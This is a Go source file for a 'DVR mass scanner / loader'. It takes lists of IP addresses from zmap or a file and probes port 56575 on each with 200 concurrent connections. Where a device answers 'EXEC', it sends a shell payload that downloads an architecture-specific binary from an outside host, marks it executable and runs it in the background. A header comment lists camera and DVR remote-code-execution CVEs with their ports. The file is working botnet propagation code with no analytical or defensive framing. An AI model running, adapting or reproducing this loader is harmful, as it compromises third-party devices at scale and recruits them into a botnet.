// main.go - DVR mass scanner / loader
//
// Usage:
//   zmap -p 56575 192.168.0.0/16 | go run main.go 56575
//   cat live.txt | go run main.go 56575
//   ./main 56575 < live.txt
//
// RCE CVEs commonly exploited against DVR/NVR/CCTV/IP-camera devices:
//   CVE-2021-36260  Hikvision IP cameras/NVRs      unauthenticated OS command injection (root RCE)  ports: 80, 443, 8080
//   CVE-2017-7921   Hikvision cameras              improper authentication / credential disclosure  ports: 80, 443, 8000
//   CVE-2021-33044  Dahua IP cameras               authentication bypass                              ports: 80, 443, 37777
//   CVE-2021-33045  Dahua IP cameras               authentication bypass                              ports: 80, 443, 37777
//   CVE-2024-13985  Dahua EIMS                     unauthenticated OS command injection               ports: 80, 443
//   CVE-2025-34036  Shenzhen TVT/OEM DVRs          unauthenticated root command injection             ports: 81, 82
//   CVE-2018-25126  TVT NVMS-9000                  hardcoded creds + root command injection           ports: 80, 443, 4567
//   CVE-2018-9995   TBK/OEM DVRs                   authentication bypass + credential disclosure        ports: 80, 443
//   CVE-2024-3721   TBK DVR-4104/DVR-4216          OS command injection                               ports: 80, 443
//   CVE-2025-34054  AVTECH IP cameras/DVRs/NVRs    unauthenticated root command injection             ports: 80, 443
//   CVE-2025-34055  AVTECH IP cameras/DVRs/NVRs    authenticated root command injection             ports: 80, 443
//   CVE-2022-23227  NUUO NVRmini2                  unauthenticated file upload -> root RCE            ports: 80, 443, 3000
//   CVE-2018-14933  NUUO NVRmini                   OS command injection                               ports: 80, 443
//   CVE-2023-47565  QNAP VioStor NVR               OS command injection                               ports: 80, 443
//   CVE-2020-25078  D-Link DCS cameras             admin password disclosure                          ports: 80, 443
//   CVE-2014-8361   Realtek SDK miniigd            UPnP SOAP RCE                                      ports: 52869, 1900
//
// Note: TCP/56575 itself has no dedicated CVE. It is one of the ports
// scanned in FBI-reported HiatusRAT campaigns against exposed Chinese-branded
// cameras/DVRs (CVE-2017-7921, CVE-2018-9995, CVE-2020-25078,
// CVE-2021-33044, CVE-2021-36260, etc.).

package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var payload = []byte("TCP_MSGHEAD_CMD cd /tmp||cd /dev/shm||cd /var/tmp; M=$(uname -m); case $M in x86_64|amd64)U=http://wemqmewkqewq.work.gd/x86_64;;i*86)U=http://wemqmewkqewq.work.gd/i686;;armv7*)U=http://wemqmewkqewq.work.gd/armv6;;aarch64|arm64)U=http://wemqmewkqewq.work.gd/aarch64;;mips)U=http://wemqmewkqewq.work.gd/mips;;mipsel)U=http://wemqmewkqewq.work.gd/mipsel;;ppc*|powerpc)U=http://wemqmewkqewq.work.gd/ppc;;sh4|sh)U=http://wemqmewkqewq.work.gd/sh4;;m68k)U=http://wemqmewkqewq.work.gd/m68k;;*)U=http://wemqmewkqewq.work.gd/x86_64;;esac; rm -f q q.tmp; (wget -q -O q.tmp $U||wget -O q.tmp $U||busybox wget -q -O q.tmp $U||busybox wget -O q.tmp $U||curl -skLo q.tmp $U); [ -s q.tmp ]&&mv q.tmp q&&chmod 777 q&&(nohup ./q massdvr >/dev/null 2>&1 &)\n")

func connect(ip string, port string, wg *sync.WaitGroup) {
	defer wg.Done()

	s, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), 5*time.Second)
	if err != nil {
		return
	}
	defer s.Close()

	t, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), 5*time.Second)
	if err != nil {
		return
	}
	defer t.Close()

	t.SetWriteDeadline(time.Now().Add(5 * time.Second))
	_, err = t.Write([]byte("TiananmenSquareMassacre\n"))
	if err != nil {
		return
	}

	t.SetReadDeadline(time.Now().Add(5 * time.Second))
	buf := make([]byte, 4096)
	n, err := t.Read(buf)
	if err != nil {
		return
	}

	if strings.Contains(string(buf[:n]), "EXEC") {
		s.SetWriteDeadline(time.Now().Add(5 * time.Second))
		s.Write(payload)
	}
}

func main() {
	port := "56575"
	if len(os.Args) > 1 {
		if _, err := strconv.Atoi(os.Args[1]); err == nil {
			port = os.Args[1]
		}
	}

	scanner := bufio.NewScanner(os.Stdin)

	sem := make(chan struct{}, 200)
	var wg sync.WaitGroup

	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if ip == "" {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(ip string) {
			defer func() { <-sem }()
			connect(ip, port, &wg)
		}(ip)
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "Error reading stdin:", err)
	}

	wg.Wait()
}
